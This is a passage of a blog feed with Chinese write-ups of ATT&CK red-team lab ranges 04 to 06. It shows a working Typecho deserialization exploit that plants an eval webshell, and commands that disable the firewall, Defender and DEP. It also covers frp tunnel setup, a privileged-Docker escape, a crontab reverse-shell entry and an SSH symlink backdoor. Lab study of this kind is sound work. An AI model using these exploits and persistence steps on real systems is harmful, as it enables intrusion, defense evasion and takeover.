src="https://raw.githubusercontent.com/chencicici/images/main/202208291709096.png"></p><p>再上线到msf维持权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291712971.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><p>现在拿到的权限有，dmz区域的外网靶机，和两台52网段的靶机.根据拿到的靶机发现还存在第三层网络93网段，并且存在域环境</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291715801.png"></p><p>添加到93网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291747112.png"></p><p>因为第二层是出网的，也可以上线cs抓一下密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111736209.png"></p><p>再用fscan扫描内网</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208292022634.png"></p><p>扫出30和40两个主机，30为dc，都存在17010永恒之蓝，上传frp配置代理到web2，因为第二层是出网的，所以直接配置一层就行（msf的隧道不稳经常掉）</p><h2 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h2><p>kali配置服务端frps.ini，启动</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111646665.png"></p><p>web2配置frpc.ini，启动方法一样</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">31.118</span> <span class="comment">#kali ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp             </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>     <span class="comment">#转发端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 </span><br></pre></td></tr></table></figure><p>porxychins添加一条，其他工具就可以走这个代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><p>msf添加一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>尝试永恒之蓝，这里要注意使用正向payload，因为目标靶机是不出网的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704262.png"></p><p>成功拿到192.168.93.40的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704743.png"></p><p>打域控的时候发现利用成功但是没返回会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111712516.png"></p><p>应该是没关防火墙，用winexe登录到域控上去把防火墙关了，前面已经用cs抓到管理员的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%Whoami2021&#x27;</span> //192.168.93.30 cmd.exe</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off #关闭防火墙</span><br><span class="line"><span class="built_in">net</span> stop windefend #关闭windefebd</span><br><span class="line">bcdedit.exe /<span class="built_in">set</span>&#123;current&#125; nx AlwaysOff #关闭DEP</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111723579.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111724439.png"></p><p>关闭防火墙后继续打，成功拿下DC</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111725473.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;DMZ区IP段为192.168.1.1&amp;#x2F;24 复制物理机网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第二层网络环境IP段为192.168.52.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第三层网络环境IP段为192.168.93.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;网络设置&quot;&gt;&lt;a href=&quot;#网络设置&quot; class=&quot;headerlink&quot; title=&quot;网络设置&quot;&gt;&lt;/a&gt;网络设置&lt;/h2&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场06</title>
    <link href="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/"/>
    <id>https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/</id>
    <published>2022-08-23T08:04:30.000Z</published>
    <updated>2022-08-25T08:54:36.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png"></p><p>首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS<br>接着是linux就开放了一个22端口，服务嘛啥也没有</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V<span class="number">3.2</span></span><br><span class="line">web\de<span class="number">1</span>ay | <span class="number">1</span>qaz<span class="title">!QAZ1qaz</span><span class="title">!QAZ</span></span><br><span class="line">de<span class="number">1</span>ay\de<span class="number">2</span>ay | <span class="number">1</span>qaz<span class="title">@WSX</span><span class="title">!QAZ2wsx</span></span><br></pre></td></tr></table></figure><p>首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改ip设置</p><p>扫下端口开放情况，只开发了80,3306，这里的80使用phpstudy起的一个typecho</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231618206.png"></p><p>打开发现报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231625116.png"></p><p>进入靶机打开phpstudy启动服务，先关闭iis，在删除网站根目录的config.inc.php，重新安装typecho，先进入数据库新建一个typecho的库，然后访问如下url，进行重新安装</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231627616.png"></p><p>然后又报了一个类错误，直接从官网从新下一个，2017年10月24日之前的所有版本都存在此靶场要利用的漏洞</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="typecho反序列化前台getshell"><a href="#typecho反序列化前台getshell" class="headerlink" title="typecho反序列化前台getshell"></a>typecho反序列化前台getshell</h2><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;echo ^&lt;?php @eval($_POST[&quot;b1ank&quot;]);?^&gt;&gt;shell.php&#x27;</span>; <span class="comment">// 执行的参数值</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;system&#x27;</span>; <span class="comment">//filter执行的函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>; <span class="comment">//进入toString内部判断条件</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_type = <span class="built_in">self</span>::<span class="variable constant_">RSS2</span>;</span><br><span class="line">            <span class="variable">$_item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(); <span class="comment">//Feed.php文件中触发__get()方法使用的对象</span></span><br><span class="line">        <span class="variable">$_item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());<span class="comment">//触发错误</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$_item</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span>=&gt;<span class="variable">$exp</span>, <span class="comment">// Db.php文件中触发__toString()使用的对象</span></span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt;<span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用post提交数据<br>url：<a href="http://192.168.31.10/typecho/install.php?finish=a">http://192.168.31.10/typecho/install.php?finish=a</a><br>Postdata：__typecho_config&#x3D;前面脚本生成的<br>Referrer：<a href="http://192.168.31.10/typecho">http://192.168.31.10/typecho</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231707526.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>连上蚁剑，上线到cs提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231716241.png"></p><p>信息收集发现还有一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231718366.png"></p><p>探测10网段存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231719352.png"></p><p>看很多文章后面就是mimikatz抓取明文密码，然后域横向，但是我这里mimikatz根本没有抓到明文密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231810645.png"></p><p>这个环境没搞懂，应该还有很多内容，没这么简单的</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS&lt;br&gt;接着是linux就开放了一个22端口，服务嘛啥也没有&lt;/p&gt;
&lt;figure class=&quot;highlight llvm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;V&lt;span class=&quot;number&quot;&gt;3.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;web\de&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;ay | &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;qaz&lt;span class=&quot;title&quot;&gt;!QAZ1qaz&lt;/span&gt;&lt;span class=&quot;title&quot;&gt;!QAZ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;de&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;ay\de&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;ay | &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;qaz&lt;span class=&quot;title&quot;&gt;@WSX&lt;/span&gt;&lt;span class=&quot;title&quot;&gt;!QAZ2wsx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改ip设置&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场05</title>
    <link href="https://syst1m.top/2022/08/19/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA05/"/>
    <id>https://syst1m.top/2022/08/19/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA05/</id>
    <published>2022-08-19T01:40:49.000Z</published>
    <updated>2022-08-19T03:02:44.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>虚拟机密码<br>win7</p><p>sun\heart 123.com</p><p>sun\Administrator dc123.com</p><p>2008</p><p>sun\admin 2020.com</p><p>Win7双网卡模拟内外网，这里我为了方便将win7的外网网卡设置为复制物理机网络并dhcp，和攻击机kali处于一个网段，进入win7启动c盘下的phpstudy</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h2><p>对外网web靶机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190948121.png"></p><p>看看web服务，tp5不多说了，掏出tp大杀器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190952037.png"></p><p>直接用工具getshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190957533.png"></p><p>上蚁剑，信息收集,发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191003798.png"></p><p>存在域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191006155.png"></p><p>定位域控</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191007293.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>生成一个无文件落地后门，上线到cs上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191013567.png"></p><p>发现一直没有上线，应该是开了防火墙，先关闭防火墙再看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment">#关闭防火墙</span></span><br><span class="line">net stop windefend <span class="comment">#关闭windefebd</span></span><br><span class="line">bcdedit.exe /set&#123;current&#125; nx AlwaysOff <span class="comment">#关闭DEP</span></span><br></pre></td></tr></table></figure><p>成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191022162.png"></p><p>创建一个smb监听器，提权到system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191026280.png"></p><p>扫描内网存活主机，进行横向移动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191046716.png"></p><p>对dc进行横向，等一会拿到dc权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191050225.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;虚拟机密码&lt;br&gt;win7&lt;/p&gt;
&lt;p&gt;sun\heart 123.com&lt;/p&gt;
&lt;p&gt;sun\Administrator dc123.com&lt;/p&gt;
&lt;p&gt;2008&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场04</title>
    <link href="https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/"/>
    <id>https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/</id>
    <published>2022-08-16T03:10:25.000Z</published>
    <updated>2022-08-17T02:51:04.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>账号密码</p><ul><li>web ubuntu:ubuntu     </li><li>域成员 douser:Dotest123 </li><li>DC administrator:Test2008</li></ul><p>环境为kali复制物理网络，ubuntu复制物理网络&#x2F;仅主机，其余都为仅主机</p><h1 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161117759.png"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对ubuntu进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161124388.png"></p><h2 id="S2"><a href="#S2" class="headerlink" title="S2"></a>S2</h2><p>挨个访问，2001端口根据title可以看到是Struts2框架</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161126930.png"></p><p>掏出检测工具,存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161138940.png"></p><p>exp直接拿下root权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161153328.png"></p><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>2002端口tomcat，想war写马但是403</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128199.png"></p><p>检测到存在cve-2017-12615</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161201997.png"></p><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>2003端口phpmyadmin未授权,首先想到的是写通过日志写马，但是没有权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128518.png"></p><p>网上找到4.8.1版本存在文件包含漏洞，可以通过写入缓存文件来getshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161224429.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161237172.png"></p><p>复现连接<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p>然后在test库中查询，写入session缓存，然后再包含这个session文件来getshell，不知道为什么我本地根本没有生成这个session文件，已经拿到两个root权限的shell，不影响</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161314665.png"></p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>根据拿到的shell收集信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321337.png"></p><p>判断是否为docker环境</p><p>ls -alh &#x2F;.dockerenv #查看是否存dockerrnv文件<br>cat &#x2F;proc&#x2F;1&#x2F;cgroup #查看系统进程的cgroup信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321490.png"></p><p>此处利用特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name privilegeTest –-privileged=<span class="literal">true</span> mongo:3.6-streth</span><br></pre></td></tr></table></figure><p> 特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起）这里tomcat容器是特权模式启动的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161431272.png"></p><p>fdisk -l #查看磁盘文件<br>mkdir &#x2F;chan #新建一个目录用于挂载<br>mount &#x2F;dev&#x2F;sda1 &#x2F;chan #将宿主机&#x2F;dev&#x2F;sda1目录挂载到容器内</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161433483.png"></p><p>再利用计划任务反弹shell，这种半交互式shell，走web协议在写计划任务的时候会有很多转义问题，直接写webshell到根目录也出各种问题，于是用kali起了一个web服务把webshell放进去，让这个tomcat容器去下载</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511233.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511479.png"></p><h2 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h2><p>写入反弹语句</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161517957.png"></p><p>写到计划任务里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /chan/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /chan/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521524.png"></p><p>kali成功收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521969.png"></p><p>构造ssh软连接后门，做权限维持</p><p>软连后门需要root执行后门命令，任意密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161604297.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161522665.png"></p><p>弹一个会话到msf上，方便内网渗透,直接用msf自带的webshell比去生成后门再上传方便很多，</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540400.png"></p><p>将生成的连接复制到刚刚返弹的shell中执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540889.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161542230.png"></p><p>拿到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161543354.png"></p><p>添加到40网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161547033.png"></p><p>使用kali自带的模块再对40网段存活主机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161617099.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161618476.png"></p><p>再进行端口探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161622111.png"></p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><p>开放了445端口尝试17010，这里要创建一个正向连接的payload，因为我们无法直接与靶机通信，反向连接的话靶机无法连接到kali</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161628372.png"></p><p>ms17-010打过去不返回会话，不知道管理员密码，作弊直接上去反弹shell，是域用户不是system运行不了mimikatz</p><p>直接寄了，后面的流程就是打到域用户，然后抓取hash制作TGT票据，然后用ms14-068打到域控，制作黄金票据维持权限</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;账号密码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;web ubuntu:ubuntu     &lt;/li&gt;
&lt;li&gt;域成员 douser:Dotest123 &lt;/li&gt;
&lt;li&gt;DC administrator:Test2008&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;环境为kali复制物理网络，ubuntu复制物理网络&amp;#x2F;仅主机，其余都为仅主机&lt;/p&gt;
&lt;h1 id=&quot;拓补图&quot;&gt;&lt;a href=&quot;#拓补图&quot; class=&quot;headerlink&quot; title=&quot;拓补图&quot;&gt;&lt;/a&gt;拓补图&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Raven2打靶</title>
    <link href="https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/</id>
    <published>2022-08-13T10:12:55.000Z</published>
    <updated>2022-08-14T03:24:52.470Z</updated>
    
